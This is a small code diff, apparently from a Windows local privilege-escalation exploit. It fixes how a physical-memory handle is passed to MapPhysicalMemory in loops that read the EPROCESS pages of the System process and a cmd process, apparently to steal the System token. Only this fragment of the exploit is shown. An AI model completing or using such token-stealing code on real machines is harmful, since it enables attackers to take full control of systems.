@@ -87,7 +87,7 @@ int main(int argc, char** argv)
 	unsigned __int64 systemToken = 0;
 
 	for (int i = 0; i < EPROCESS_SYSTEM.size(); i++) {
-		if (MapPhysicalMemory(hPhysicalMemory, EPROCESS_SYSTEM_page[i], bufSize, buf) == FALSE) {
+		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, EPROCESS_SYSTEM_page[i], bufSize, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
 		}
@@ -122,7 +122,7 @@ int main(int argc, char** argv)
 
 
 	for (int i = 0; i < EPROCESS_cmd.size(); i++) {
-		if (MapPhysicalMemory(hPhysicalMemory, EPROCESS_cmd_page[i], 0x4000, buf) == FALSE) {
+		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, EPROCESS_cmd_page[i], 0x4000, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
 			return -1;
 		}
